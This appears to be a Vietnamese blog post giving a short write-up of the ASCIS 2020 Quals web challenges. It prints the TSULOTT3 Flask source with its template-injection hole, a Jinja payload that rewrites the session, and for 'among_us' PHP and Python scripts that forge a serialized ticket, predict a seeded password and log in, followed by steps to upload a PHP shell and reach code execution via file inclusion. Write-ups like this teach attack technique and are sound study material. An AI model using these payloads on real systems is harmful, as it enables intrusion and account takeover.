<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASCIS 2020 Quals - Web</title>
    <meta name="description" content="I am writing about my experiences as a naval navel-gazer.">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="preconnect" href="/" crossorigin>
    <link rel="stylesheet" href="/css/index.css">
    <link rel="stylesheet" href="/css/prism-tomorrow.css">
    <link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="son&#39;s blog">
    <link rel="alternate" href="/feed/feed.json" type="application/json" title="son&#39;s blog">
  </head>
  <body>
    <header>
      <h1 class="home"><a href="/">son&#39;s blog</a></h1>
      <ul class="nav">
        <li class="nav-item"><a href="/">Home</a></li>
        <li class="nav-item"><a href="/posts/">Posts</a></li>
      </ul>
    </header>

    <main class="tmpl-post">
      <h1>ASCIS 2020 Quals - Web</h1>

<h2 id="tsulott3">TSULOTT3 <a class="direct-link" href="#tsulott3">#</a></h2>
<p>Đề chỉ có 1 file <code>main.py</code> như sau:</p>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string</span><br><span class="highlight-line"><span class="token keyword">from</span> flask_session <span class="token keyword">import</span> Session</span><br><span class="highlight-line"><span class="token keyword">from</span> random <span class="token keyword">import</span> randint <span class="token keyword">as</span> ri</span><br><span class="highlight-line"></span><br><span class="highlight-line">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></span><br><span class="highlight-line">SESSION_TYPE <span class="token operator">=</span> <span class="token string">'filesystem'</span></span><br><span class="highlight-line">app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></span><br><span class="highlight-line">Session<span class="token punctuation">(</span>app<span class="token punctuation">)</span></span><br><span class="highlight-line">cheat <span class="token operator">=</span> <span class="token string">"Pls Don't cheat! "</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">def</span> <span class="token function">check_session</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">	<span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span></span><br><span class="highlight-line">		<span class="token keyword">return</span> <span class="token string">""</span></span><br><span class="highlight-line">	<span class="token keyword">return</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span><br><span class="highlight-line"><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">	<span class="token keyword">try</span><span class="token punctuation">:</span></span><br><span class="highlight-line">		session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span></span><br><span class="highlight-line">		session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"jackpot"</span><span class="token punctuation">)</span></span><br><span class="highlight-line">	<span class="token keyword">except</span><span class="token punctuation">:</span></span><br><span class="highlight-line">		<span class="token keyword">pass</span></span><br><span class="highlight-line">	<span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span></span><br><span class="highlight-line">		ok <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'ok'</span><span class="token punctuation">]</span></span><br><span class="highlight-line">		session<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span></span><br><span class="highlight-line">		<span class="token keyword">if</span> ok <span class="token operator">==</span> <span class="token string">"Go"</span><span class="token punctuation">:</span></span><br><span class="highlight-line">			session<span class="token punctuation">[</span><span class="token string">"check"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"access"</span></span><br><span class="highlight-line">			jackpot <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span>ri<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span></span><br><span class="highlight-line">			session<span class="token punctuation">[</span><span class="token string">"jackpot"</span><span class="token punctuation">]</span> <span class="token operator">=</span> jackpot</span><br><span class="highlight-line">			<span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"Generating jackpot...&lt;script>setInterval(function(){ window.location='/guess'; }, 500);&lt;/script>"</span><span class="token punctuation">)</span></span><br><span class="highlight-line">	<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"start.html"</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span><br><span class="highlight-line"><span class="token keyword">def</span> <span class="token function">guess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">	<span class="token keyword">try</span><span class="token punctuation">:</span></span><br><span class="highlight-line">		<span class="token keyword">if</span> check_session<span class="token punctuation">(</span><span class="token string">"check"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span></span><br><span class="highlight-line">			<span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>cheat<span class="token operator">+</span>check_session<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><br><span class="highlight-line">		<span class="token keyword">else</span><span class="token punctuation">:</span></span><br><span class="highlight-line">			<span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span></span><br><span class="highlight-line">				jackpot_input <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'jackpot'</span><span class="token punctuation">]</span></span><br><span class="highlight-line">				<span class="token keyword">if</span> jackpot_input <span class="token operator">==</span> check_session<span class="token punctuation">(</span><span class="token string">"jackpot"</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">					mess <span class="token operator">=</span> <span class="token string">"Really? GG "</span><span class="token operator">+</span>check_session<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">", here your flag: ASCIS{xxxxxxxxxxxxxxxxxxxxxxxxx}"</span></span><br><span class="highlight-line">				<span class="token keyword">elif</span> jackpot_input <span class="token operator">!=</span> check_session<span class="token punctuation">(</span><span class="token string">"jackpot"</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">					mess <span class="token operator">=</span> <span class="token string">"May the Luck be with you next time!&lt;script>setInterval(function(){ window.location='/reset_access'; }, 1200);&lt;/script>"</span></span><br><span class="highlight-line">				<span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>mess<span class="token punctuation">)</span></span><br><span class="highlight-line">			<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"guess.html"</span><span class="token punctuation">)</span></span><br><span class="highlight-line">	<span class="token keyword">except</span><span class="token punctuation">:</span></span><br><span class="highlight-line">		<span class="token keyword">pass</span></span><br><span class="highlight-line">	<span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>cheat<span class="token operator">+</span>check_session<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/reset_access'</span><span class="token punctuation">)</span></span><br><span class="highlight-line"><span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">	<span class="token keyword">try</span><span class="token punctuation">:</span></span><br><span class="highlight-line">		session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"check"</span><span class="token punctuation">)</span></span><br><span class="highlight-line">		<span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"Reseting...&lt;script>setInterval(function(){ window.location='/'; }, 500);&lt;/script>"</span><span class="token punctuation">)</span></span><br><span class="highlight-line">	<span class="token keyword">except</span><span class="token punctuation">:</span></span><br><span class="highlight-line">		<span class="token keyword">pass</span></span><br><span class="highlight-line">	<span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>cheat<span class="token operator">+</span>check_session<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></span><br><span class="highlight-line">	app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxxxx'</span></span><br><span class="highlight-line">	app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></span></code></pre>
<h3 id="c%C3%A1ch-1">Cách 1 <a class="direct-link" href="#c%C3%A1ch-1">#</a></h3>
<pre><code>POST /

name={% set x=session.update({'check': 'access', 'jackpot': ''}) %}&amp;ok=
</code></pre>
<pre><code>POST /guess

jackpot=
</code></pre>
<h3 id="c%C3%A1ch-2">Cách 2 <a class="direct-link" href="#c%C3%A1ch-2">#</a></h3>
<p><em>Không khai thác SSTI</em></p>
<ol>
<li>Submit name bất kì tại <code>/</code>, sau đó sẽ được redirect sang <code>/guess</code>.</li>
</ol>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token comment"># Mô tả session</span></span><br><span class="highlight-line">session <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'anything'</span><span class="token punctuation">,</span> <span class="token string">'check'</span><span class="token punctuation">:</span> <span class="token string">'access'</span><span class="token punctuation">,</span> <span class="token string">'jackpot'</span><span class="token punctuation">:</span> <span class="token string">'xx xx xx xx xx xx'</span><span class="token punctuation">}</span></span></code></pre>
<ol start="2">
<li>Truy cập lại về <code>/</code>.</li>
</ol>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token comment"># Mô tả session</span></span><br><span class="highlight-line">session <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'check'</span><span class="token punctuation">:</span> <span class="token string">'access'</span><span class="token punctuation">}</span></span></code></pre>
<ol start="3">
<li>Quay trở lại <code>/guess</code> và submit với 1 input rỗng (vì hàm <code>check_session</code> sẽ trả về chuỗi rỗng nếu key không tồn tại).</li>
</ol>
<h2 id="among_us">among_us <a class="direct-link" href="#among_us">#</a></h2>
<ol>
<li>Viết PHP script để generate ra <code>ticket</code> và password mới cho user</li>
</ol>
<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><br><span class="highlight-line"><span class="token keyword">class</span> <span class="token class-name">CrewMate</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">	<span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'tsu'</span><span class="token punctuation">;</span></span><br><span class="highlight-line">	<span class="token keyword">public</span> <span class="token variable">$secret_number</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token punctuation">}</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CrewMate</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token variable">$se</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$se</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token variable">$de</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$se</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token variable">$secret_number</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$de</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret_number</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token variable">$random_rand</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$secret_number</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token function">srand</span><span class="token punctuation">(</span><span class="token variable">$random_rand</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token variable">$new_password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$new_password</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">    <span class="token variable">$new_password</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line"><span class="token punctuation">}</span></span><br><span class="highlight-line"><span class="token keyword">echo</span> <span class="token single-quoted-string string">'New password: '</span> <span class="token punctuation">.</span> <span class="token variable">$new_password</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span></span><br><span class="token delimiter important">?></span></span></code></pre>
<ol start="2">
<li>Viết Python script để tự động hóa việc lấy token để đăng nhập</li>
</ol>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token keyword">from</span> re <span class="token keyword">import</span> findall</span><br><span class="highlight-line"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5</span><br><span class="highlight-line"><span class="token keyword">import</span> requests</span><br><span class="highlight-line"></span><br><span class="highlight-line">REGEX_TOKEN <span class="token operator">=</span> <span class="token string">r'name="token" value="(.*?)"'</span></span><br><span class="highlight-line">PHPSESSID <span class="token operator">=</span> <span class="token string">''</span> <span class="token comment"># Nhập PHPSESSID vào biến</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://35.240.156.48/?page=forgot'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> PHPSESSID</span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">)</span></span><br><span class="highlight-line">    token <span class="token operator">=</span> findall<span class="token punctuation">(</span>REGEX_TOKEN<span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></span><br><span class="highlight-line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://35.240.156.48/?page=forgot'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'ticket'</span><span class="token punctuation">:</span> <span class="token string">'Tzo4OiJDcmV3TWF0ZSI6Mjp7czo0OiJu[redacted]'</span><span class="token punctuation">,</span> <span class="token comment"># Ticket được lấy từ PHP script ở trên</span></span><br><span class="highlight-line">        <span class="token string">'token'</span><span class="token punctuation">:</span> token</span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> PHPSESSID</span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://35.240.156.48/?page=login'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> PHPSESSID</span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">)</span></span><br><span class="highlight-line">    token <span class="token operator">=</span> findall<span class="token punctuation">(</span>REGEX_TOKEN<span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></span><br><span class="highlight-line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://35.240.156.48/?page=login'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'tsu'</span><span class="token punctuation">,</span></span><br><span class="highlight-line">        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'117856802212731241191535857466'</span><span class="token punctuation">,</span> <span class="token comment"># Password được lấy từ PHP script ở trên</span></span><br><span class="highlight-line">        <span class="token string">'token'</span><span class="token punctuation">:</span> token</span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> PHPSESSID</span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">)</span></span></code></pre>
<p>Chạy cho đến khi script bị lỗi tại hàm <code>findall</code> thì dừng lại (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).</p>
<ol start="3">
<li>Upload 1 PHP shell và server sẽ tạo 1 file zip chứa file mình mới upload lên và sẽ được xóa cho đến khi có 1 lượt upload khác.</li>
<li>Sử dụng lỗi LFI ở trang <code>index.php</code> + zip wrapper để include PHP shell trong file zip =&gt; RCE.</li>
<li>Lấy flag ở trong database.</li>
</ol>


<hr>
<ul><li>Previous: <a href="/posts/tsgctf-2020-beginners-pwn/">TSGCTF 2020 - Beginner&#39;s Pwn</a></li>
</ul>

    </main>

    <footer></footer>

    <!-- Current page: /posts/ascis-2020-quals-web-short-writeup/ -->
  </body>
</html>
